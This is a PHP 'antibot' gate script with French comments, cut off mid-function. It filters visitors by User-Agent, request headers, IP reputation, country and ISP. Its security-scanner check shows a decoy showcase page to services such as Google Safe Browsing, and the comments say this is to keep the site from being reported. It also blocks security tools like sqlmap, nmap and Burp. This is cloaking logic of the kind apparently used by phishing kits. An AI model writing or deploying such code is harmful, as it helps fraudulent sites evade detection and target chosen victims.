<?php
declare(strict_types=1);
date_default_timezone_set('Europe/Paris');


// Définir la constante pour permettre l'inclusion des modules protégés
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

require_once __DIR__ . '/../modules/load_config.php';
require_once __DIR__ . '/concurrent_manager.php';
require_once __DIR__ . '/monitoring/performance_monitor.php';
require_once __DIR__ . '/monitoring/integration_manager.php';
require_once __DIR__ . '/detect_bots.php';
require_once __DIR__ . '/progressive_ban.php';

// Démarrage de session pour éviter les vérifications multiples
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Constantes pour l'optimisation
define('CACHE_TTL', 300); // 5 minutes
define('SESSION_CACHE_TTL', 1800); // 30 minutes
define('MAX_CONCURRENT_REQUESTS', 50);
define('REQUEST_TIMEOUT', 3);

/* -------------------------------------------------------------------------- */
/*                      Configuration                                         */
/* -------------------------------------------------------------------------- */

$url  = getConfig('URL_REDIRECT', null);
$apiKey  = getConfig('API_IPAPI', null);
$redirectURL = getConfig('URL_REDIRECT', null);

$paths       = [
    'whitelist'   => __DIR__ . '/../config/whitelist.txt',
    'bannedIPs'   => __DIR__ . '/../logs/ip_ban.txt',
    'banLog'      => __DIR__ . '/../logs/banned_visits.txt',
    'visitLog'    => __DIR__ . '/../logs/click.json',
    'antibotConf' => __DIR__ . '/../config/antibots_config.json',
    'allowedISPs' => __DIR__ . '/allowed_isps.json',
];

/* -------------------------------------------------------------------------- */
/*                      Fonctions Utilitaires                                 */
/* -------------------------------------------------------------------------- */

if (!function_exists('isSecurityScanner')) {
function isSecurityScanner(): bool {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Charger les patterns depuis le fichier JSON
    $scannersFile = __DIR__ . '/security_scanners.json';
    if (!file_exists($scannersFile)) {
        return false;
    }
    
    $scannersData = json_decode(file_get_contents($scannersFile), true);
    if (!isset($scannersData['scanners']) || !is_array($scannersData['scanners'])) {
        return false;
    }
    
    // Parcourir tous les scanners et leurs patterns
    foreach ($scannersData['scanners'] as $scanner) {
        if (isset($scanner['patterns']) && is_array($scanner['patterns'])) {
            foreach ($scanner['patterns'] as $pattern) {
                if (preg_match($pattern, $userAgent)) {
                    return true;
                }
            }
        }
    }
    
    return false;
}
}

if (!function_exists('getUserIP')) {
function getUserIP(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', (string)$_SERVER[$key]);
            return trim(reset($ipList));
        }
    }
    return 'UNKNOWN';
}
}

if (!function_exists('isSessionCached')) {
function isSessionCached(string $ip): ?bool {
    $sessionKey = 'antibot_' . md5($ip);
    if (isset($_SESSION[$sessionKey])) {
        $cached = $_SESSION[$sessionKey];
        if (time() - $cached['timestamp'] < SESSION_CACHE_TTL) {
            return $cached['authorized'];
        }
        unset($_SESSION[$sessionKey]);
    }
    return null;
}
}

if (!function_exists('setSessionCache')) {
function setSessionCache(string $ip, bool $authorized): void {
    $sessionKey = 'antibot_' . md5($ip);
    $_SESSION[$sessionKey] = [
        'authorized' => $authorized,
        'timestamp' => time()
    ];
}
}

if (!function_exists('getCachedIPData')) {
function getCachedIPData(string $ip): ?array {
    $cacheFile = __DIR__ . '/../cache/ipapi_cache_' . md5($ip) . '.json';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < CACHE_TTL)) {
        $data = json_decode(file_get_contents($cacheFile), true);
        return $data ?: null;
    }
    return null;
}
}

if (!function_exists('setCachedIPData')) {
function setCachedIPData(string $ip, array $data): void {
    $cacheDir = __DIR__ . '/../cache';
    if (!is_dir($cacheDir)) {
        @mkdir($cacheDir, 0755, true);
    }
    $cacheFile = $cacheDir . '/ipapi_cache_' . md5($ip) . '.json';
    @file_put_contents($cacheFile, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}
}

if (!function_exists('logBlockedVisit')) {
function logBlockedVisit(string $ip, string $country, string $isp, string $reason, string $logFile): void {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(
        $logFile,
        "[$timestamp] IP: $ip | Country: $country | ISP: $isp | Reason: $reason" . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
}
}

if (!function_exists('exitWithBan')) {
function exitWithBan(string $url): void {
    http_response_code(403);
    // Rediriger vers la page de bannissement locale si l'URL est externe
    if (strpos($url, 'http') === 0) {
        header("Location: ../pages/ban.php");
    } else {
        header("Location: ../pages/ban.php");
    }
    exit;
}
}

if (!function_exists('isBotUserAgent')) {
function isBotUserAgent(): bool {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // 1. Vérification stricte des User-Agents vides ou suspects
    if (empty($userAgent) || $userAgent === '-' || $userAgent === 'unknown') {
        return true;
    }
    
    // 2. Vérification de la longueur (trop court = suspect)
    if (strlen($userAgent) < 10) {
        return true;
    }
    
    // 3. VÉRIFICATION PRIORITAIRE : Bots sophistiqués (AVANT les navigateurs légitimes)
    $sophisticatedBots = [
        '/\(selenium\)/i', '/\(puppeteer\)/i', '/\(playwright\)/i',
        '/\(headless\)/i', '/\(phantomjs\)/i', '/\(mechanize\)/i',
        '/\(scrapy\)/i', '/\(requests\)/i', '/\(httpclient\)/i',
        '/\(axios\)/i', '/\(fetch\)/i', '/\(restsharp\)/i',
        '/selenium/i', '/puppeteer/i', '/playwright/i',
        '/headless/i', '/phantomjs/i', '/mechanize/i',
        '/scrapy/i', '/requests/i', '/httpclient/i',
        '/axios/i', '/fetch/i', '/restsharp/i'
    ];
    
    foreach ($sophisticatedBots as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    // 4. NOUVELLE VÉRIFICATION : Navigateurs légitimes connus (APRÈS vérification bots)
    $legitimateBrowsers = [
        // Chrome
        '/mozilla\/5\.0.*chrome\/\d+\.\d+.*safari\/\d+\.\d+/i',
        '/mozilla\/5\.0.*chrome\/\d+\.\d+.*edg\/\d+\.\d+/i',
        // Firefox
        '/mozilla\/5\.0.*firefox\/\d+\.\d+/i',
        '/mozilla\/5\.0.*gecko\/\d+.*firefox\/\d+\.\d+/i',
        // Safari
        '/mozilla\/5\.0.*safari\/\d+\.\d+.*version\/\d+\.\d+/i',
        '/mozilla\/5\.0.*macintosh.*safari\/\d+\.\d+/i',
        // Edge
        '/mozilla\/5\.0.*windows.*edg\/\d+\.\d+/i',
        // Opera
        '/mozilla\/5\.0.*opera\/\d+\.\d+/i',
        '/mozilla\/5\.0.*opr\/\d+\.\d+/i',
        // Mobile browsers
        '/mozilla\/5\.0.*mobile.*safari\/\d+\.\d+/i',
        '/mozilla\/5\.0.*android.*chrome\/\d+\.\d+/i',
        '/mozilla\/5\.0.*iphone.*safari\/\d+\.\d+/i'
    ];
    
    // Si c'est un navigateur légitime, vérifier les headers supplémentaires
    $isLegitimateBrowser = false;
    foreach ($legitimateBrowsers as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            $isLegitimateBrowser = true;
            break;
        }
    }
    
    // 5. Vérification des headers pour les navigateurs légitimes
    if ($isLegitimateBrowser) {
        // Vérifier la présence des headers essentiels d'un navigateur
        $essentialHeaders = [
            'HTTP_ACCEPT',
            'HTTP_ACCEPT_LANGUAGE', 
            'HTTP_ACCEPT_ENCODING'
        ];
        
        $missingHeaders = 0;
        foreach ($essentialHeaders as $header) {
            if (!isset($_SERVER[$header]) || empty($_SERVER[$header])) {
                $missingHeaders++;
            }
        }
        
        // Si trop de headers manquent, c'est suspect même pour un navigateur légitime
        if ($missingHeaders >= 2) {
            return true;
        }
        
        // Vérifier la cohérence des headers
        $accept = $_SERVER['HTTP_ACCEPT'] ?? '';
        if (strpos($accept, 'text/html') === false && strpos($accept, 'application/xhtml') === false) {
            return true; // Pas de support HTML = suspect
        }
        
        // Si c'est un navigateur légitime avec des headers cohérents, autoriser
        return false;
    }
    
    // 5. Patterns de bots critiques (priorité haute) - RENFORCÉ
    $criticalBots = [
        '/bot/i', '/crawl/i', '/spider/i', '/curl/i', '/wget/i',
        '/python/i', '/java/i', '/go-http/i', '/libwww/i',
        '/headless/i', '/phantom/i', '/selenium/i', '/puppeteer/i',
        '/playwright/i', '/mechanize/i', '/scrapy/i', '/requests/i',
        '/httpclient/i', '/okhttp/i', '/axios/i', '/fetch/i',
        '/postman/i', '/insomnia/i', '/httpie/i', '/restsharp/i',
        '/nmap/i', '/nikto/i', '/sqlmap/i', '/burp/i', '/zap/i',
        '/masscan/i', '/nuclei/i', '/gobuster/i', '/dirb/i',
        '/facebookexternalhit/i', '/twitterbot/i', '/linkedinbot/i',
        '/googlebot/i', '/bingbot/i', '/yandexbot/i', '/baiduspider/i',
        '/semrushbot/i', '/ahrefsbot/i', '/mj12bot/i', '/dotbot/i',
        // NOUVEAUX PATTERNS POUR BOTS SOPHISTIQUÉS (avec et sans parenthèses)
        '/\(selenium\)/i', '/\(puppeteer\)/i', '/\(playwright\)/i',
        '/\(headless\)/i', '/\(phantomjs\)/i', '/\(mechanize\)/i',
        '/\(scrapy\)/i', '/\(requests\)/i', '/\(httpclient\)/i',
        '/\(axios\)/i', '/\(fetch\)/i', '/\(restsharp\)/i',
        '/\(aiohttp\)/i', '/\(httpx\)/i', '/\(urllib\)/i',
        '/\(node-fetch\)/i', '/\(got\)/i', '/\(superagent\)/i',
        '/\(needle\)/i', '/\(unirest\)/i', '/\(request\)/i',
        // Patterns sans parenthèses pour capturer les variantes
        '/selenium/i', '/puppeteer/i', '/playwright/i',
        '/headless/i', '/phantomjs/i', '/mechanize/i',
        '/scrapy/i', '/requests/i', '/httpclient/i',
        '/axios/i', '/fetch/i', '/restsharp/i'
    ];
    
    foreach ($criticalBots as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    // 6. Vérification des patterns suspects dans le JSON
    $botJsonFile = __DIR__ . '/list_bots.json';
    if (file_exists($botJsonFile)) {
        $botsList = json_decode(file_get_contents($botJsonFile), true);
        if (is_array($botsList)) {
            foreach ($botsList as $bot) {
                if (empty($bot) || trim($bot) === '') continue;
                
                // Vérifier si c'est un pattern regex (contient des caractères spéciaux)
                $isRegex = preg_match('/[\[\]{}()*+?^$|\\\\]/', $bot);
                
                if ($isRegex) {
                    // C'est un pattern regex, l'utiliser directement
                    if (preg_match('/' . $bot . '/i', $userAgent)) {
                        return true;
                    }
                } else {
                    // C'est un pattern simple, recherche insensible à la casse
                    if (stripos($userAgent, $bot) !== false) {
                        return true;
                    }
                }
            }
        }
    }
    
    // 7. Vérification de cohérence des headers (moins stricte pour les navigateurs)
    if (!isset($_SERVER['HTTP_ACCEPT']) || empty($_SERVER['HTTP_ACCEPT'])) {
        return true; // Pas d'Accept header = suspect
    }
    
    // 8. Vérification des User-Agents trop génériques
    $genericPatterns = [
        '/^mozilla\/5\.0$/i', '/^mozilla$/i', '/^browser$/i',
        '/^web/i', '/^http/i', '/^client/i'
    ];
    
    foreach ($genericPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    // 9. NOUVELLE VÉRIFICATION : Détection des bots sophistiqués
    $sophisticatedPatterns = [
        '/\(bot\)/i', '/\(crawler\)/i', '/\(spider\)/i',
        '/\(scanner\)/i', '/\(test\)/i', '/\(debug\)/i',
        '/\(aiohttp\)/i', '/\(httpx\)/i', '/\(urllib\)/i',
        '/\(node-fetch\)/i', '/\(got\)/i', '/\(superagent\)/i',
        '/\(needle\)/i', '/\(unirest\)/i', '/\(request\)/i'
    ];
    
    foreach ($sophisticatedPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return true;
        }
    }
    
    // 10. VÉRIFICATION AVANCÉE : Cohérence du User-Agent
    // Vérifier si le User-Agent contient des incohérences
    if (preg_match('/mozilla/i', $userAgent) && !preg_match('/applewebkit|gecko|khtml/i', $userAgent)) {
        return true; // Mozilla sans moteur de rendu = suspect
    }
    
    return false;
}
}

if (!function_exists('getUserDevice')) {
function getUserDevice(): string {
    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    return preg_match('/mobile|iphone|android|ipad|ipod/', $ua) ? 'mobile' : 'desktop';
}
}

/* -------------------------------------------------------------------------- */
/*  Chargement Configs                                                       */
/* -------------------------------------------------------------------------- */
$ip = getUserIP();

// ✅ NOUVEAU: Vérification des scanners de sécurité (Google Safe Browsing, etc.)
// Redirection vers page vitrine pour éviter le report du site
if (isSecurityScanner()) {
    // Log de la visite du scanner (optionnel)
    $logFile = __DIR__ . '/../logs/security_scanners.log';
    $timestamp = date('Y-m-d H:i:s');
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    file_put_contents(
        $logFile,
        "[$timestamp] IP: $ip | Scanner UA: $userAgent" . PHP_EOL,
        FILE_APPEND | LOCK_EX
    );
    
    // Redirection vers la page vitrine avec headers de sécurité
    header("HTTP/1.1 200 OK");
    header("X-Content-Type-Options: nosniff");
    header("X-Frame-Options: DENY");
    header("X-XSS-Protection: 1; mode=block");
    header("Referrer-Policy: strict-origin-when-cross-origin");
    header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
    header("Cache-Control: no-cache, no-store, must-revalidate");
    header("Pragma: no-cache");
    header("Expires: 0");
    header("Location: ../pages/vitrine.php");
    exit;
}

// ✅ SÉCURITÉ RENFORCÉE : Vérifier les bots AVANT toutes les autres vérifications
$isBot = isBotUserAgent();
if ($isBot) {
    logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Bot détecté AVANT vérifications", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

// ✅ Vérification de whitelist immédiatement après avoir obtenu l'IP
$allowedIPs = file_exists($paths['whitelist'])
    ? array_map('trim', file($paths['whitelist'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))
    : [];

if (in_array($ip, $allowedIPs, true)) {
    // ✅ SÉCURITÉ : Vérifier quand même les bots même pour IPs whitelistées
    if ($isBot) {
        logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Bot détecté sur IP whitelistée", $paths['banLog']);
        exitWithBan($redirectURL);
    }
    return;
}

// ✅ Vérification si l'utilisateur a déjà validé le captcha
// ✅ SÉCURITÉ RENFORCÉE : Vérifier l'IP et ajouter une vérification de token
if (isset($_SESSION['captcha_valide']) && $_SESSION['captcha_valide'] === true) {
    // ✅ MODIFIÉ : Vérifier l'IP mais être plus flexible
    // Si captcha_ip n'existe pas encore (ancienne session), le créer
    if (!isset($_SESSION['captcha_ip'])) {
        $_SESSION['captcha_ip'] = $ip;
    }
    
    // Vérifier que l'IP correspond à celle qui a passé le captcha
    // ✅ MODIFIÉ : Autoriser si IP correspond OU si captcha_ip n'était pas défini (compatibilité)
    if ($_SESSION['captcha_ip'] === $ip || !isset($_SESSION['captcha_ip'])) {
        // Vérifier que ce n'est pas un bot (double vérification)
        if (!$isBot) {
            // Mettre à jour l'IP du captcha si elle n'était pas définie
            if (!isset($_SESSION['captcha_ip'])) {
                $_SESSION['captcha_ip'] = $ip;
            }
            setSessionCache($ip, true);
            return;
        } else {
            // Bot détecté malgré captcha - bannir
            unset($_SESSION['captcha_valide'], $_SESSION['captcha_ip']);
            logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Bot détecté malgré captcha validé", $paths['banLog']);
            file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
            setSessionCache($ip, false);
            exitWithBan($redirectURL);
        }
    } else {
        // IP différente - logger mais ne pas invalider immédiatement (peut être un changement d'IP légitime)
        error_log("Captcha: IP différente détectée - IP captcha: {$_SESSION['captcha_ip']}, IP actuelle: $ip");
        // ✅ MODIFIÉ : Ne pas invalider le captcha si l'IP change (peut être un proxy ou changement d'IP)
        // Unset seulement si c'est vraiment suspect (ex: IP complètement différente)
        // Pour l'instant, on garde le captcha valide mais on log
    }
}

// ✅ Vérification du cache de session pour éviter les vérifications répétées
// ✅ SÉCURITÉ RENFORCÉE : Vérifier les bots même avec cache
$sessionResult = isSessionCached($ip);
if ($sessionResult !== null) {
    // Cache hit de session - enregistrer dans les métriques
    PerformanceMonitor::recordCacheHit($ip, 'session');
    
    if (!$sessionResult) {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        session_unset();
        session_destroy();
        exitWithBan($redirectURL);
    }
    
    // ✅ SÉCURITÉ : Vérifier quand même les bots même avec cache positif
    if ($isBot) {
        // Invalider le cache et bannir
        $sessionKey = 'antibot_' . md5($ip);
        unset($_SESSION[$sessionKey]);
        logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Bot détecté malgré cache session valide", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
    
    // ✅ SÉCURITÉ RENFORCÉE : Ne pas retourner ici, continuer pour vérifier pays/ISP
    // Le cache de session indique seulement que l'utilisateur n'est pas un bot,
    // mais on doit quand même vérifier le pays et l'ISP à chaque requête
    // (sauf si captcha validé, qui bypass tout)
}

$antibotsConfig = json_decode(@file_get_contents($paths['antibotConf']), true);
$allowedISPs    = json_decode(@file_get_contents($paths['allowedISPs']), true);

if (!$antibotsConfig || !$allowedISPs) {
    exit('❌ Erreur chargement configuration JSON');
}

// ✅ OPTIMISATION: Vérifier le cache d'IPs autorisées avant l'API
$authorizedIPsCache = __DIR__ . '/../cache/authorized_ips.json';
$authorizedIPs = [];

if (file_exists($authorizedIPsCache)) {
    $authorizedIPs = json_decode(file_get_contents($authorizedIPsCache), true) ?: [];
    
    // Vérifier si l'IP est déjà dans le cache des IPs autorisées
    if (isset($authorizedIPs[$ip])) {
        $cachedData = $authorizedIPs[$ip];
        
        // Vérifier si le cache n'est pas expiré (24h)
        if (time() - $cachedData['timestamp'] < 86400) {
            // ✅ SÉCURITÉ RENFORCÉE : Vérifier quand même les bots même avec cache
            if ($isBot) {
                // Bot détecté - invalider le cache et bannir
                unset($authorizedIPs[$ip]);
                file_put_contents($authorizedIPsCache, json_encode($authorizedIPs, JSON_PRETTY_PRINT), LOCK_EX);
                logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Bot détecté malgré cache authorized_ips valide", $paths['banLog']);
                file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
                setSessionCache($ip, false);
                exitWithBan($redirectURL);
            }
            
            // ✅ SÉCURITÉ RENFORCÉE : Vérifier le pays/ISP même avec cache authorized_ips
            // Le cache authorized_ips contient les données du pays/ISP précédemment autorisés
            // On doit vérifier qu'ils sont toujours valides
            $cachedCountry = strtoupper($cachedData['country'] ?? 'UNKNOWN');
            $cachedISP = $cachedData['isp'] ?? 'UNKNOWN';
            
            // Vérifier si le pays/ISP en cache sont toujours autorisés
            $cachedCountryValid = in_array($cachedCountry, $antibotsConfig['allowed_countries'] ?? [], true);
            $cachedISPValid = false;
            
            if (isset($allowedISPs[$cachedCountry])) {
                foreach ($allowedISPs[$cachedCountry] as $allowed) {
                    if (stripos($cachedISP, $allowed) !== false) {
                        $cachedISPValid = true;
                        break;
                    }
                }
            }
            
            // ✅ SÉCURITÉ CRITIQUE : Si le pays/ISP en cache ne sont plus autorisés, invalider le cache
            if (!$cachedCountryValid || !$cachedISPValid) {
                // Le pays/ISP en cache ne sont plus autorisés - invalider le cache
                unset($authorizedIPs[$ip]);
                file_put_contents($authorizedIPsCache, json_encode($authorizedIPs, JSON_PRETTY_PRINT), LOCK_EX);
                // Continuer pour récupérer les données actuelles et vérifier
            } else {
                // Le pays/ISP en cache sont toujours valides, mais on doit quand même
                // récupérer les données actuelles pour vérifier qu'elles n'ont pas changé
                // (ex: IP réutilisée, changement de pays/ISP)
                PerformanceMonitor::recordCacheHit($ip, 'authorized');
                // On continue pour récupérer les données actuelles et vérifier
            }
        } else {
            // Cache expiré - supprimer l'entrée
            unset($authorizedIPs[$ip]);
            file_put_contents($authorizedIPsCache, json_encode($authorizedIPs, JSON_PRETTY_PRINT), LOCK_EX);
        }
    }
}

if (file_exists($paths['bannedIPs'])) {
    $bannedIPs = file($paths['bannedIPs'], FILE_IGNORE_NEW_LINES);
    if (in_array($ip, $bannedIPs, true)) {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        session_unset();
        session_destroy();
        exitWithBan($redirectURL);
    }
}

/* -------------------------------------------------------------------------- */
/*  Requête IP-API (cURL) avec fallback gratuit + cache optimisé             */
/* -------------------------------------------------------------------------- */

// Vérification du cache optimisé
$data = getCachedIPData($ip);

if ($data !== null) {
    // Cache hit - enregistrer dans les métriques
    PerformanceMonitor::recordCacheHit($ip, 'file');
}

if ($data === null) {
    // Vérifier si on peut faire une requête simultanée
    if (!ConcurrentRequestManager::startRequest()) {
        // Si trop de requêtes simultanées, attendre un slot ou BLOQUER
        if (!ConcurrentRequestManager::waitForSlot(3)) {
            // Trop de requêtes simultanées: BLOQUER pour éviter les attaques DoS
            logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "Too many concurrent requests", $paths['banLog']);
            file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
            setSessionCache($ip, false);
            exitWithBan($redirectURL);
        }
    }
    
    try {
        // Si IP locale / loopback -> forcer une IP publique de test (ex: 8.8.8.8) pour la requête,
        // mais on continuera à logguer l'IP réelle (utile en dev).
        if (in_array($ip, ['127.0.0.1', '::1', 'UNKNOWN'], true) || preg_match('/^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.)/', $ip)) {
            $queryIp = '8.8.8.8';
        } else {
            $queryIp = $ip;
        }

        // Construire l'URL : pro si clé, sinon endpoint gratuit
        if (!empty($apiKey)) {
            $apiUrl = sprintf(
                'http://pro.ip-api.com/json/%s?key=%s&fields=status,message,countryCode,proxy,query,isp,mobile,hosting,as',
                urlencode($queryIp),
                urlencode($apiKey)
            );
        } else {
            $apiUrl = sprintf(
                'http://ip-api.com/json/%s?fields=status,message,countryCode,proxy,query,isp,mobile,hosting,as',
                urlencode($queryIp)
            );
        }

        // Utiliser le pool de connexions cURL avec monitoring
        $startTime = microtime(true);
        $ch = CurlPool::getCurlHandle();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        $response = curl_exec($ch);
        $curlErr  = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        CurlPool::returnCurlHandle($ch);
        
        $duration = microtime(true) - $startTime;
        $success = ($response !== false && !$curlErr && $httpCode === 200);
        PerformanceMonitor::recordRequest($ip, $duration, $success, 'api');
    } finally {
        ConcurrentRequestManager::endRequest();
    }

    if ($response === false || $curlErr) {
        // ÉCHEC cURL -> BLOQUER IMMÉDIATEMENT (mode restrictif)
        logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API cURL Error: $curlErr", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }

    $data = json_decode($response, true);
    if (!$data) {
        // JSON invalide -> BLOQUER IMMÉDIATEMENT (mode restrictif)
        logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API JSON Error: Invalid response", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }

    // Si la réponse indique fail pour pro key invalide -> retenter le fallback gratuit une fois
    if (($data['status'] ?? '') === 'fail' && !empty($apiKey) && stripos($data['message'] ?? '', 'invalid') !== false) {
        $fallbackUrl = sprintf('http://ip-api.com/json/%s?fields=status,message,countryCode,proxy,query,isp,mobile,hosting,as', urlencode($queryIp));
        $ch = CurlPool::getCurlHandle();
        curl_setopt($ch, CURLOPT_URL, $fallbackUrl);
        $response2 = curl_exec($ch);
        $curlErr2  = curl_error($ch);
        CurlPool::returnCurlHandle($ch);

        if ($response2 && !$curlErr2) {
            $data2 = json_decode($response2, true);
            if ($data2 && ($data2['status'] ?? '') === 'success') {
                $data = $data2;
            } else {
                // FALLBACK ÉCHOUÉ -> BLOQUER IMMÉDIATEMENT (mode restrictif)
                logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API fallback failed - Status: " . ($data2['status'] ?? 'unknown'), $paths['banLog']);
                file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
                setSessionCache($ip, false);
                exitWithBan($redirectURL);
            }
        } else {
            // FALLBACK cURL ERROR -> BLOQUER IMMÉDIATEMENT (mode restrictif)
            logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API fallback cURL error: $curlErr2", $paths['banLog']);
            file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
            setSessionCache($ip, false);
            exitWithBan($redirectURL);
        }
    }

    // Sauvegarder le résultat en cache optimisé
    setCachedIPData($ip, $data);
}

// VÉRIFICATION FINALE STRICTE - MODE RESTRICTIF
if (!is_array($data) || ($data['status'] ?? '') !== 'success') {
    // STATUS NON SUCCESS -> BLOQUER IMMÉDIATEMENT (mode restrictif)
    $message = $data['message'] ?? 'unknown';
    $status = $data['status'] ?? 'unknown';
    logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API status fail: $status - $message", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

// VÉRIFICATION STRICTE DES DONNÉES API - MODE RESTRICTIF
if (empty($data['countryCode']) || empty($data['isp'])) {
    // Données API incomplètes -> BLOQUER IMMÉDIATEMENT
    logBlockedVisit($ip, 'UNKNOWN', 'UNKNOWN', "API data incomplete - Missing countryCode or ISP", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

// Si tout bon -> standardiser champs
$country   = strtoupper($data['countryCode'] ?? 'UNKNOWN');
$isp       = $data['isp'] ?? 'UNKNOWN';
$asname    = strtoupper($data['as'] ?? 'UNKNOWN');
$device    = getUserDevice();
$isProxy   = (bool)($data['proxy'] ?? false);
$isHosting = (bool)($data['hosting'] ?? false);
// ✅ SÉCURITÉ : $isBot déjà vérifié au début, mais re-vérifier pour être sûr
if (!isset($isBot)) {
    $isBot = isBotUserAgent();
}
// ✅ SÉCURITÉ RENFORCÉE : Double vérification des bots après récupération des données API
if ($isBot) {
    logBlockedVisit($ip, $country, $isp, "Bot détecté après récupération données API", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

/* -------------------------------------------------------------------------- */
/*  Validation STRICTE Pays + ISP - MODE RESTRICTIF AVEC CAPTCHA             */
/* -------------------------------------------------------------------------- */
$countryValid = in_array($country, $antibotsConfig['allowed_countries'] ?? [], true);
$deviceValid  = in_array($device, $antibotsConfig['devices'] ?? [], true);
$ispValid     = false;

// ✅ SÉCURITÉ RENFORCÉE : Vérifier d'abord si c'est un utilisateur légitime (pas proxy/vpn/bot)
// Note: $isBot est déjà vérifié et bloqué plus haut, mais on le garde pour cohérence
$isLegitimateUser = !$isProxy && !$isHosting && !$isBot;

// ✅ SÉCURITÉ ADDITIONNELLE : Vérifier les headers même pour utilisateurs "légitimes"
// Un bot sophistiqué peut avoir un User-Agent légitime mais manquer de headers
if ($isLegitimateUser) {
    $essentialHeaders = ['HTTP_ACCEPT', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_ACCEPT_ENCODING'];
    $missingHeaders = 0;
    foreach ($essentialHeaders as $header) {
        if (!isset($_SERVER[$header]) || empty($_SERVER[$header])) {
            $missingHeaders++;
        }
    }
    // Si trop de headers manquent, considérer comme suspect
    if ($missingHeaders >= 2) {
        $isLegitimateUser = false;
        $isBot = true; // Traiter comme bot
        logBlockedVisit($ip, $country, $isp, "Headers manquants malgré UA légitime", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
}

// VÉRIFICATION : Le pays DOIT être dans la liste autorisée
if (!$countryValid) {
    // Si utilisateur légitime (pas proxy/vpn/bot) -> CAPTCHA
    if ($isLegitimateUser) {
        logBlockedVisit($ip, $country, $isp, "Pays non autorisé (redirigé vers captcha): $country", $paths['banLog']);
        // Vérifier si on n'est pas déjà sur la page captcha pour éviter la boucle
        $currentScript = basename($_SERVER['SCRIPT_NAME']);
        if ($currentScript !== 'captcha.php') {
            header('Location: ../captcha.php');
            exit;
        }
    } else {
        // Si proxy/vpn/bot détecté -> BANNIR DIRECTEMENT
        logBlockedVisit($ip, $country, $isp, "Pays non autorisé + Proxy/VPN/Bot: $country", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
}

// VÉRIFICATION : L'ISP DOIT être dans la liste pour ce pays
if (isset($allowedISPs[$country])) {
    foreach ($allowedISPs[$country] as $allowed) {
        if (stripos($isp, $allowed) !== false || stripos($asname, $allowed) !== false) {
            $ispValid = true;
            break;
        }
    }
} else {
    // Pays autorisé mais pas de liste ISP
    if ($isLegitimateUser) {
